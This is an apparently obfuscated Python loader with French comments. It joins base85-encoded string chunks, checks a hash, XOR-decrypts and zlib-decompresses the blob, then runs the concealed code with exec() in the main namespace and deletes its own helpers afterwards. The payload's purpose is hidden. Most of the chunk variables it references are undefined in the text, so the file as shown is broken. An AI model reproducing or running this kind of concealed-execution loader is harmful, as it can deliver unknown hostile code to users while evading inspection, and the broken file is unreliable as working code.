_czcifn8av3A1Ps = 'E42AoZ~LnRFa!@6!eTp8c<H4ZgYNfiHdH;z-?400Vp<'
_cx7M9_3hbfX3Mq = '5LanOTy!sU%Yfl#~yLcytBBB6*hcLQsBalIj@%+jkOC'
_cl7gQvW4rsG8vE = 'WCW-7dBBJ1<keo$1xC&E3~ADsaAv9;Xb!CLPl_exMYS'
_cb01JiBSO04p1H = 'OajjKDHiru*fst4Nc7@=g(HW4mU8V2p3OnO>q7U%gyy'
_cjAmUUiPj5SeJ0 = 'AnH<1*$pisRs&_#5U{rgDDB)&^-H0nlWaY!oyiD@BWh'
_codh0FpGTFL9nG = 'zzcdp<B^B%l!A*zS7U9$XtL60wSmPFTUG7af^?V4!a%'
_ctbuKH6A2MUsxN = 'Yn)L$t9Fj_Y4;5qqJO*oF;n@Lvx_MYby~})MmrR+X=P'
_cuDQSBd4EZ5TOY = 'lVLdbf8GA(i_`|04WAs=~jh6j`4p8tL;L!9YW_9<V^O'
_cpcUeP798UTsCi = 's&3@?sQg;)^=(~fa5K1x8Df+aAkEqSoV;G(*rYm#ZDj'
_cmqnB8BO8OZvDG = ')?e4qEt9g{UMrXp1D6X*zJaf#5!*u7;C1la~X7u^BMK'
_cbQPIGbgx_eo9g = 'Wz({%z5tf05%wz(Eh@`caSKVJ=pUBwr2m=WL(AH@@<O'
_cq65gmcGJ1aqLT = 'e;>5|7c{g4N#c5+|Cx(xqn{b2NdXg_0%r!njCH<SM_}'
_ct9jwuZk7kb3vP = 'g=q=_j(AJALnpL76L}S-U0V?j|Yivks-l8fh;KyALJw'
_cbShghxRb4U38e = 'vK4X1qzEMVDnERuJP?W?_o4&_<|4K3XZKLl!J~_YtQp'
_cbXOcn5ndWTTPJ = '=~&PC3cnEHfrI~1ipR$WGm_0VI%!HtAgBn5|sE!oBj='
_cx1vUniiTXQqXe = '$l}tgelMXiYwy|OQWE_*v#H_0t0YDlIctCK@E0gWidQ'
_cw_pmnjkm372oy = 'Zb^b%0DO_|MUF`3Ja9llk7^NY;eXHzY=%clZ*}A1?(P'
_c_2shkxJH5FhI_ = 'Bq_?pb=VMrTh~@45cpo$Z+!gq_8hLX%$+%<1@<;dwtn'
_ccBe2JKpftDJ81 = 'liZ3YeOjFyU(jO>9dQaNti%EL&Li$Tl(Kd)+;ml3dW1'
_cpAG7DsuVsCom7 = 'gfHEw$!(8|W=yA|?$_vdZen;-K?AJwHHmw_oo_%Bn-g'
_clhbIuTTFkjGFy = '-w?MR1PZ-t3nvsH3-_DIw=29;hz?i9;xjtW4lE6zy+F'
_cezsHLIRVQzz1A = 'T%^9^{i;G%A#@66oAWD;F+x81Y2AhFJvS#DjeBnCxVj'
_cqGktwY1kzDgwN = 'gUl;_*rO=GF4w9KurLAb=23rHPcok{jV#X~!?@ActpZ'
_ctatlD2AcCViGI = '^ZlO?z1%XiE8+rpLpb#X>4^><%@;cvfIBAz>OCiu$=w'
_chBDO21voD4V7w = 'cw#{@57#Zz3f?0^se?2M5ID1gseHd4h5nC)6m<%K!`W'
_cjndb7scg_Jeuk = 'E%u#_Tc'

_pxM_VJF9231s8W = __import__('base64').b85decode(_cmYTjpIb9b2Sgm + _ctaRpqhl2jRPea + _cvYJCL653q0tuh + _cbh2D98haj6hYr + _cu5eMtipiUPuE1 + _clA_KxZIdMp64V + _cj3Q1_wkfy8Af0 + _cabNNTF7EAzOxr + _csjvLfSxqkhM5H + _cnbAlhA9vcBuNl + _ck6fqi4lc0MJIv + _cd3Tr4fF_54yVa + _csKMIckCCbByJ2 + _chhPfPCdtn9HYR + _cd5DfwNKgwBSjl + _chx4s3X7Pa65bb + _caYQlhMkEW6_wn + _cxcLj06Jvtj7vS + _c_OUogoOqt7EYW + _cjo4L6oPVymTwz + _cd6D4pfhupEJBJ + _cfY4IN9lv1ZvfN + _csLbJqf1WBYpfz + _cjAn8gUEYOj_YY + _cbWd8Wde2mdOxd + _cbiwAA0VujjDBa + _cyH7IwOzAGF4P0 + _cqE4FhwtGHSmhX + _cueZ60RhZvBDHz + _cvwLgzlf42u5fz + _chW0w92WPbQJSU + _cresMPj5hFem81 + _caw4qM1n72f2Pc + _cicPJ9HHVKWuSa + _cr8XEL1wAoM16W + _cvu4V1Ynrm3_Mt + _ccsBLiXT516XVp + _cgz3Czp7SAA3sG + _carZRVsvtgbhue + _c_ILfn5RKDube3 + _clk9O7gHllpXsS + _cgTtRlV3xeNfrH + _cq829mseCJ3c30 + _cndNeCjgJ9e7mz + _cvC8rcH5FZ5Vvt + _cudSU8et3pGm92 + _cgaELjUjkon22Y + _cnVcK94NSnwMxM + _cy5erris5tdzeW + _cmpYkHZMxis8pr + _cuR3yAwirb2L2A + _cyXZda6U8Z3TTj + _cbIiGZ2GUYuOmJ + _ce3qKWj06l3yI0 + _ca01pCvdQHq5_B + _clqMTU5cLUBaSI + _csD3KzOPBXPmMD + _chVcSe1Xgv8OEO + _cbPDg7HU_RsDRa + _cgolDoQnXCsl06 + _ciwTulsR7K0qDH + _ckOWqe4ENQ9ak6 + _cvZScK9s8qOfIw + _cyMueZV8cvyQ9j + _ctpH50e4ivurij + _crwshiRGgx707x + _cs6n1jCRvuGINS + _ct5BQE4k1REmYy + _cy90z1NFOJffAI + _czX6uSHaovROKh + _cit9Cw9oRiAQkR + _cw_HULSmgTNaiy + _cj6X02lMMf2PpI + _cl4pECgEz_r1Hq + _cq4EvMnMnsJqXU + _cksvBTcrsXKxol + _cv2ZJjaTCY5tci + _c_7XkbrqhzVUYu + _c_g1tvV7RTnQuG + _chXBRjUPFgIeWo + _cjYqOqrQaIn5YD + _cbxYK2n8oeHniP + _cjzhBLTp8_jkAt + _caMISFV_A0MD6y + _creD1_sAKLhbRy + _coXIKyraieDydI + _cqHinjtFJs2xQl + _csEwfVQSWBDncA + _cxUs6Qz2N9HknG + _ciz0QFKWg8LQZQ + _cogFPeiU2K9wxn + _cgs4CzNuIkHfdB + _cfLAL0YfczqmP6 + _crO49QgHfFt5UQ + _ci_vWBoY_SkGJl + _cvGCQ6EAxCPoFj + _cjJnC9j7XUy_be + _cwyY0yejfTk3yr + _cv31_AHHXBRO1M + _cg_EVF2D3GkyAj + _crfSAgb5TUAmVN + _crAK2V6oc7IMz_ + _cfJjKGBp_q3yim + _cxV3fO_X0s2RJW + _ccNZAUQfJyHeGu + _ckL6HIRW2R24kU + _cf4Y8SvB2VdgIP + _cf_g8OQvrkdjPB + _cywGQ7VKmQAWZ8 + _cuGolp8BlRX5VI + _ch_TGboyjQ9yc5 + _caiWERKIl62ELk + _cp2hoIimfKMbsb + _c_aT55hTQjdv5w + _cqR3mtfIj7p8qX + _cpnEnUv09gS7m2 + _cna1rBOlqtLhOk + _cisoH21H_iMNB6 + _cfNVYJYJHQ4KVE + _cvp0Cw3yPWmc3x + _cxP6yEgSmtMtyY + _chtqLw6RfR5cq_ + _ccd4n_LuqNcIy6 + _czGWmONtqyt3Sj + _chA0jxt2ViAw0V + _cm2wq6XGs7UuvA + _cwpQ2FqYDFnFfk + _cjgpk5kanm2pYA + _claBuNfBcXPRlL + _czKv0aaeBWeUKW + _cq9rq7DRs7ub7Q + _coTNLcY45EsNZP + _cwoMjluy5WT3KO + _ck7e9XZLppHFLd + _c_SaOTbvh9ZM1G + _ccIYmTMmXMKyYv + _cnCrqKGZza_Rvj + _cnXgpYMWsws1Uh + _cpTVuo1n3jGUqP + _cz3HY4_AzI7mUf + _cwvNypEhZ4JQsa + _cp3svxw0jIr63e + _cmaegwhNIWEiE5 + _cxL0JKQjCuytWc + _cdo6VLHxeOgFLC + _clmVIdpsfkVGIf + _cacCHspa9TXt6n + _cxsQDXPo6CVa0U + _cvXxegtFsWOqow + _cgeNxiFpWnWT6o + _cmlfLB8Wo8DR3e + _ck7bIw04MH19_b + _cdL85UIEPF4LjN + _ch3b0MiViwgpV_ + _cojMB9Gx0GyT8w + _czoo2N2S4VXfUR + _c_zPUk4m9jf5uD + _ct69q5F5ZWn6tX + _cpi5BAAxaymR5d + _cgTv93bhwvm3IC + _caEtFxtjqP6l3p + _cdMVyTNrBIu5fb + _czZkmYpdRla70p + _ciOz5dvnLKR5c2 + _csaBQO6oB_z2LQ + _c_wSxjqIw1yqhn + _czjCqvXYRtNgEk + _cgwxZxqXd3oWLV + _csKl1wibw324mq + _cr1F6Epj7Hzd51 + _crdEu0b7ra1JOv + _cm_8LKtDPrzdEV + _crKGY4Y7OJ2PJV + _ce_U7AT4yPrHCm + _coXCiFeDhA_ueW + _cwaxCCTfeDZCzw + _cmpgPu6A94HsX9 + _cy7ZAgS7ceJgb1 + _cqOC_7qhsoffNu + _cipEYy2vUUKvBP + _cnJEL43JqEH3P7 + _cyaiTI0dBP5SbR + _chs3pmBDMtWJkb + _ckJqkJJ9OF8Be3 + _ctCmXRzvcK0agd + _cxGE_OjoAZe8Hf + _cjReDo64JWRYVo + _cfvNWI2DHYbA6x + _ciIfQNBVwtrFo7 + _clXyG2tzgR4fAu + _ctNWtxw08GkQ3j + _cwxIwoEo3b8VB2 + _cxB1g6J_LkDFx_ + _cnpLV3JrksrpQf + _cqPCrp_ipW56V4 + _ckXt0kJxSawNQg + _ckXG2vu45JLy09 + _cyfSXGNNlMvIBE + _cmG8Lqrkz25dWE + _cytfkUrG49mHum + _ckcXVzfAYODseq + _cuh6IxTc_Fyt3Z + _cdE2euSi6LbuXb + _caCE1DwgXRj2AO + _cqXA688bEWytrm + _cpO3mWGZYWxclI + _cf0dF8F9F97Zzk + _cuFFWdOWJSoAOw + _cknWF7AJSh17U0 + _cgjDDlLKjqQgcf + _caPqmB_UE5pBAu + _cssdjcmY3CXrEt + _ct4i0PJozx2M92 + _cv8MtSXG0AXhpb + _cygObkACXjRFMr + _cwamC2jklm8mn1 + _c_R76j9XL59djK + _crJv1fLU7nIQXx + _chDackyFQCUCZu + _ceRo30Uxy1haLl + _czmk3Sd1hWSd0b + _cuStDuM3CYMA7o + _cua5Cq5l7xzUAv + _crEhziGJnqA5cZ + _ceMWEi5C6lNcqj + _ct0d4Hin7nWiRk + _ca6Ke3RDrOJ1Uz + _cxXSpKj7pndmMO + _crqn9W8aqrIxDh + _cipp5wjCRwcqeL + _cqpu7bHNp5swuE + _cz3gg3n9cHrvOo + _czcifn8av3A1Ps + _cx7M9_3hbfX3Mq + _cl7gQvW4rsG8vE + _cb01JiBSO04p1H + _cjAmUUiPj5SeJ0 + _codh0FpGTFL9nG + _ctbuKH6A2MUsxN + _cuDQSBd4EZ5TOY + _cpcUeP798UTsCi + _cmqnB8BO8OZvDG + _cbQPIGbgx_eo9g + _cq65gmcGJ1aqLT + _ct9jwuZk7kb3vP + _cbShghxRb4U38e + _cbXOcn5ndWTTPJ + _cx1vUniiTXQqXe + _cw_pmnjkm372oy + _c_2shkxJH5FhI_ + _ccBe2JKpftDJ81 + _cpAG7DsuVsCom7 + _clhbIuTTFkjGFy + _cezsHLIRVQzz1A + _cqGktwY1kzDgwN + _ctatlD2AcCViGI + _chBDO21voD4V7w + _cjndb7scg_Jeuk)
if __import__('hashlib').sha256(_pxM_VJF9231s8W).hexdigest() != '12ac811ae653e2b24180865cb690bccc05d9586c5b8a69ecbcc31b2cff5db26e':
    __import__('sys').exit(1)
_xuvVNhbMVpYFIT = bytes([15, 162, 92, 112, 2, 130, 229, 134, 152, 100, 211, 3, 25, 236, 161, 112, 252, 255, 235, 199, 18, 118, 106, 226, 215, 227, 236, 222, 153, 20, 248, 248])
_fkm0pGi1BY6m8JT = bytes([64, 191, 244, 90, 42, 206, 194, 57, 247, 138, 241, 1, 225, 210, 197, 72, 132, 206, 96, 95, 125, 211, 165, 119, 176, 190, 160, 95, 173, 218, 229, 207])

def _fxoCb1KnT4hcxX0(_b_omspdG9Qmli8, _knzKfgKb5DvZWq):
    return bytes(_b_omspdG9Qmli8[_i_1SlLhK2v_qDM] ^ _knzKfgKb5DvZWq[_i_1SlLhK2v_qDM % len(_knzKfgKb5DvZWq)] for _i_1SlLhK2v_qDM in range(len(_b_omspdG9Qmli8)))

def _fdwAGS5Xl4XpyyI(_tdf64YY0GuJ7O_):
    import zlib
    return zlib.decompress(_tdf64YY0GuJ7O_) # Un seul niveau de zlib ici pour simplifier

def _fepUYKak45JaV1k():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xiENDc2E4p91Y8 = _fxoCb1KnT4hcxX0(_pxM_VJF9231s8W, _xuvVNhbMVpYFIT)
    # 2. Décompression Zlib
    _dcItgyAgEl6SJi = _fdwAGS5Xl4XpyyI(_xiENDc2E4p91Y8)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dcItgyAgEl6SJi.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nyreR_BD1WBf91 = _main.__dict__
    _nyreR_BD1WBf91.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nyreR_BD1WBf91)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fepUYKak45JaV1k()
try:
    del _fxoCb1KnT4hcxX0, _fdwAGS5Xl4XpyyI, _fepUYKak45JaV1k
    del _pxM_VJF9231s8W, _xuvVNhbMVpYFIT, _fkm0pGi1BY6m8JT
except:
    pass
